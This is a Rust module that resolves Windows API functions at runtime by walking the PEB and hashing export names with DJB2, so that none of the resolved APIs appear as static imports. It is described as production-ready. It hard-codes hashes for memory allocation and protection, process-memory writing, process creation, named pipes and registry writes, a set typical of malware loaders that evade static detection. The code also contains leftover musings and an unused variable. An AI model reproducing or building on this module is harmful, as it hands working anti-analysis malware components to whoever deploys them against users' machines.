#![allow(dead_code)]
#![allow(non_snake_case)]

//! # Dynamic API Resolution (Production-Ready)
//!
//! Resolves Windows APIs at runtime using PEB walking + DJB2 hashing.
//! Zero static imports for resolved APIs.
//!
//! ## Key Features
//! - Compile-time DJB2 hash constants (verified)
//! - PEB walking for module enumeration  
//! - Export table parsing for function resolution
//! - Case-insensitive module name matching
//!
//! ## Usage
//! ```rust
//! unsafe {
//!     let virtual_alloc: VirtualAllocFn = resolve_api(HASH_KERNEL32, HASH_VIRTUAL_ALLOC)?;
//!     let buffer = virtual_alloc(ptr::null(), size, MEM_COMMIT | MEM_RESERVE, PAGE_RW);
//! }
//! ```

use std::ffi::c_void;
use std::mem;

// ============================================================================
// DJB2 HASH FUNCTION (Compile-time capable)
// ============================================================================

/// DJB2 hash algorithm - deterministic, fast, low collision rate for short strings
pub const fn djb2(s: &[u8]) -> u32 {
    let mut hash: u32 = 5381;
    let mut i = 0;
    while i < s.len() {
        hash = hash.wrapping_shl(5).wrapping_add(hash) ^ (s[i] as u32);
        i += 1;
    }
    hash
}

// ============================================================================
// PRE-COMPUTED API HASHES (Verified with calc_all_hashes.rs)
// ============================================================================

// Module name hashes (case-insensitive, lowercase comparison)
pub const HASH_KERNEL32: u32 = 0x3E003875;  // kernel32.dll
pub const HASH_NTDLL: u32 = 0xE91AAD51;     // ntdll.dll
pub const HASH_ADVAPI32: u32 = 0x03C6B585;  // advapi32.dll

// Kernel32 Functions
pub const HASH_VIRTUAL_ALLOC: u32 = 0x19FBBF49;
pub const HASH_VIRTUAL_PROTECT: u32 = 0x17EA484F;
pub const HASH_VIRTUAL_FREE: u32 = 0x0888E730;
pub const HASH_CREATE_FILE_W: u32 = 0xCDF70C30;
pub const HASH_WRITE_FILE: u32 = 0xDE34165E;
pub const HASH_READ_FILE: u32 = 0x245D06B1;
pub const HASH_CLOSE_HANDLE: u32 = 0x687C0D79;
pub const HASH_GET_MODULE_HANDLE_A: u32 = 0x4AB16D82;
pub const HASH_GET_MODULE_FILE_NAME_A: u32 = 0xE60575E9;
pub const HASH_GET_PROC_ADDRESS: u32 = 0xAADFAB0B;
pub const HASH_LOAD_LIBRARY_A: u32 = 0x01ED9ADD;
pub const HASH_CREATE_PROCESS_A: u32 = 0x5768C90B;
pub const HASH_SET_FILE_ATTRIBUTES_W: u32 = 0x06039E99;
pub const HASH_CREATE_DIRECTORY_W: u32 = 0xAB50B59F;
pub const HASH_CREATE_NAMED_PIPE_A: u32 = 0xE01EC06F;
pub const HASH_CONNECT_NAMED_PIPE: u32 = 0x02853EF4;
pub const HASH_GET_LAST_ERROR: u32 = 0x83363C81;

// Registry Functions (advapi32)
pub const HASH_REG_CREATE_KEY_EX_W: u32 = 0x9CB4594C;
pub const HASH_REG_SET_VALUE_EX_W: u32 = 0x02ACF196;
pub const HASH_REG_CLOSE_KEY: u32 = 0x66579AD4;
pub const HASH_REG_OPEN_KEY_EX_W: u32 = 0x9139725C;
pub const HASH_REG_QUERY_VALUE_EX_W: u32 = 0x6383195E;

// Ntdll Functions (for syscalls/low-level)
pub const HASH_NT_ALLOCATE_VIRTUAL_MEMORY: u32 = 0xF0146CE2;
pub const HASH_NT_PROTECT_VIRTUAL_MEMORY: u32 = 0xCD363694;
pub const HASH_NT_WRITE_VIRTUAL_MEMORY: u32 = 0x411B83A2;
pub const HASH_NT_CREATE_FILE: u32 = 0xD797B1BD;
pub const HASH_NT_CLOSE: u32 = 0xF866D229;

// ============================================================================
// PE STRUCTURES
// ============================================================================

#[repr(C)]
struct ImageExportDirectory {
    characteristics: u32,
    time_date_stamp: u32,
    major_version: u16,
    minor_version: u16,
    name: u32,
    base: u32,
    number_of_functions: u32,
    number_of_names: u32,
    address_of_functions: u32,
    address_of_names: u32,
    address_of_name_ordinals: u32,
}

// ============================================================================
// MODULE LOOKUP (PEB Walking)
// ============================================================================

/// Get module base address by DJB2 hash of module name (case-insensitive).
/// Walks the PEB InMemoryOrderModuleList to find loaded modules.
#[cfg(all(windows, target_arch = "x86_64"))]
pub unsafe fn get_module_by_hash(target_hash: u32) -> Option<*const c_void> {
    // Get PEB via GS segment register (x64)
    let peb: *const u8;
    std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb, options(nostack, pure, readonly));
    
    // PEB->Ldr at offset 0x18
    let ldr = *(peb.add(0x18) as *const *const u8);
    // Ldr->InMemoryOrderModuleList at offset 0x20
    let list_head = ldr.add(0x20);
    let mut entry = *(list_head as *const *const u8);
    let head = entry;
    
    loop {
        if entry.is_null() { break; }
        
        // LDR_DATA_TABLE_ENTRY offsets (relative to InMemoryOrderLinks):
        // +0x20 = DllBase
        // +0x48 = BaseDllName.Length
        // +0x50 = BaseDllName.Buffer
        let base = *((entry as usize + 0x20) as *const *const c_void);
        let name_len = *((entry as usize + 0x48) as *const u16) as usize / 2; // Length in bytes -> chars
        let name_ptr = *((entry as usize + 0x50) as *const *const u16);
        
        if !name_ptr.is_null() && name_len > 0 && !base.is_null() {
            let hash = djb2_wide_lower(name_ptr, name_len);
            if hash == target_hash {
                return Some(base);
            }
        }
        
        // Move to next entry (Flink at offset 0)
        entry = *(entry as *const *const u8);
        if entry == head { break; }
    }
    
    None
}

/// DJB2 hash for wide string, converting to lowercase for case-insensitive matching.
fn djb2_wide_lower(s: *const u16, len: usize) -> u32 {
    let mut hash: u32 = 5381;
    for i in 0..len {
        let c = unsafe { *s.add(i) } as u32;
        // ASCII uppercase (A-Z: 65-90) -> lowercase (add 32)
        let c_lower = if c >= 65 && c <= 90 { c + 32 } else { c };
        hash = hash.wrapping_shl(5).wrapping_add(hash) ^ c_lower;
    }
    hash
}

// ============================================================================
// EXPORT LOOKUP
// ============================================================================

/// Get export function address by DJB2 hash.
/// Parses the PE export directory to find the function.
/// HANDLES FORWARDED EXPORTS.
pub unsafe fn get_export_by_hash(module: *const c_void, func_hash: u32) -> Option<*const c_void> {
    if module.is_null() { return None; }
    
    let dos = module as *const u8;
    if *(dos as *const u16) != 0x5A4D { return None; }
    
    let e_lfanew = *((dos as usize + 0x3C) as *const i32);
    let nt = dos.add(e_lfanew as usize);
    if *(nt as *const u32) != 0x00004550 { return None; }
    
    let export_rva = *((nt as usize + 0x88) as *const u32);
    let export_size = *((nt as usize + 0x8C) as *const u32);
    if export_rva == 0 { return None; }
    
    let export = dos.add(export_rva as usize) as *const ImageExportDirectory;
    let num_names = (*export).number_of_names;
    let names = dos.add((*export).address_of_names as usize) as *const u32;
    let funcs = dos.add((*export).address_of_functions as usize) as *const u32;
    let ordinals = dos.add((*export).address_of_name_ordinals as usize) as *const u16;
    
    for i in 0..num_names as usize {
        let name_rva = *names.add(i);
        let name_ptr = dos.add(name_rva as usize);
        
        let mut len = 0;
        while *name_ptr.add(len) != 0 { len += 1; }
        
        let name_slice = std::slice::from_raw_parts(name_ptr, len);
        if djb2(name_slice) == func_hash {
            let ordinal = *ordinals.add(i) as usize;
            let func_rva = *funcs.add(ordinal);
            let func_addr = dos.add(func_rva as usize);
            
            // Check for forwarded export
            if func_rva >= export_rva && func_rva < (export_rva + export_size) {
                return resolve_forwarded_export(func_addr);
            }
            
            return Some(func_addr as *const c_void);
        }
    }
    None
}

/// Helper to resolve forwarded export string "DLL.Function"
unsafe fn resolve_forwarded_export(fwd_ptr: *const u8) -> Option<*const c_void> {
    let mut len = 0;
    while *fwd_ptr.add(len) != 0 { len += 1; }
    let fwd_str = std::str::from_utf8(std::slice::from_raw_parts(fwd_ptr, len)).ok()?;
    
    // Format: "DLL.Name"
    let parts: Vec<&str> = fwd_str.splitn(2, '.').collect();
    if parts.len() != 2 { return None; }
    
    let dll_name = parts[0];
    let func_name = parts[1];
    
    // Ensure DLL is loaded
    // Need to append ".dll" if missing for LoadLibrary
    let dll_full = if dll_name.to_lowercase().ends_with(".dll") {
        dll_name.to_string()
    } else {
        format!("{}.dll", dll_name)
    };
    
    // Hash module name to check if loaded
    let dll_bytes = dll_full.as_bytes();
    let dll_hash = djb2(dll_bytes); // djb2 handles conversion internally? No, we used djb2_wide_lower for modules.
    
    // Wait, get_module_by_hash expects hash of wide, lower case string.
    // Simpler: Just try LoadLibraryA directly.
    
    let mut dll_c_str = dll_full.clone().into_bytes();
    dll_c_str.push(0);
    
    // We can't trust get_module_by_hash here easily without converting hash logic
    // Just force LoadLibraryA (it handles existing modules fast)
    let h_module = load_library(&dll_c_str)?;
    
    // Get export by NAME (not hash)
    get_export_by_name(h_module, func_name)
}

/// Get export by name string
/// Get export by name string
pub unsafe fn get_export_by_name(module: *const c_void, target_name: &str) -> Option<*const c_void> {
    if module.is_null() { return None; }
    let dos = module as *const u8;
    if *(dos as *const u16) != 0x5A4D { return None; }
    let e_lfanew = *((dos as usize + 0x3C) as *const i32);
    let nt = dos.add(e_lfanew as usize);
    let export_rva = *((nt as usize + 0x88) as *const u32);
    let export_size = *((nt as usize + 0x8C) as *const u32);
    if export_rva == 0 { return None; }
    
    let export = dos.add(export_rva as usize) as *const ImageExportDirectory;
    let names = dos.add((*export).address_of_names as usize) as *const u32;
    let funcs = dos.add((*export).address_of_functions as usize) as *const u32;
    let ordinals = dos.add((*export).address_of_name_ordinals as usize) as *const u16;
    
    for i in 0..(*export).number_of_names as usize {
        let name_rva = *names.add(i);
        let name_ptr = dos.add(name_rva as usize);
        
        let mut len = 0;
        while *name_ptr.add(len) != 0 { len += 1; }
        
        let name_slice = std::slice::from_raw_parts(name_ptr, len);
        let name_str = std::str::from_utf8(name_slice).ok()?;
        
        if name_str.eq_ignore_ascii_case(target_name) {
             let ordinal = *ordinals.add(i) as usize;
            let func_rva = *funcs.add(ordinal);
            let func_addr = dos.add(func_rva as usize);
            
            // Recurse for nested forwarders? Rarely happens but possible.
            if func_rva >= export_rva && func_rva < (export_rva + export_size) {
                return resolve_forwarded_export(func_addr);
            }
            
            return Some(func_addr as *const c_void);
        }
    }
    
    // Handle Ordinal forwarding "#123" if needed? 
    // Usually names resolve to names.
    None
}

// ============================================================================
// CONVENIENCE FUNCTIONS  
// ============================================================================

/// Resolve an API function by module hash and function hash.
/// Returns the function pointer transmuted to the desired type.
pub unsafe fn resolve_api<T>(module_hash: u32, func_hash: u32) -> Option<T> {
    let module = get_module_by_hash(module_hash)?;
    let func = get_export_by_hash(module, func_hash)?;
    Some(mem::transmute_copy(&func))
}

/// Load a DLL by name and return its base address.
pub unsafe fn load_library(dll_name: &[u8]) -> Option<*const c_void> {
    type LoadLibraryA = unsafe extern "system" fn(*const u8) -> *const c_void;
    let load_lib: LoadLibraryA = resolve_api(HASH_KERNEL32, HASH_LOAD_LIBRARY_A)?;
    let result = load_lib(dll_name.as_ptr());
    if result.is_null() { None } else { Some(result) }
}

/// Ensure a module is loaded, loading it if necessary.
pub unsafe fn ensure_module_loaded(module_hash: u32, dll_name: &[u8]) -> Option<*const c_void> {
    if module_hash != 0 {
        if let Some(base) = get_module_by_hash(module_hash) {
            return Some(base);
        }
    }
    load_library(dll_name)
}

// ============================================================================
// UTILITY FUNCTIONS
// ============================================================================

/// Convert a Rust string to a null-terminated wide string (UTF-16).
pub fn to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

// ============================================================================
// STUBS FOR NON-WINDOWS/NON-x64 PLATFORMS
// ============================================================================

#[cfg(not(all(windows, target_arch = "x86_64")))]
pub unsafe fn get_module_by_hash(_: u32) -> Option<*const c_void> { None }
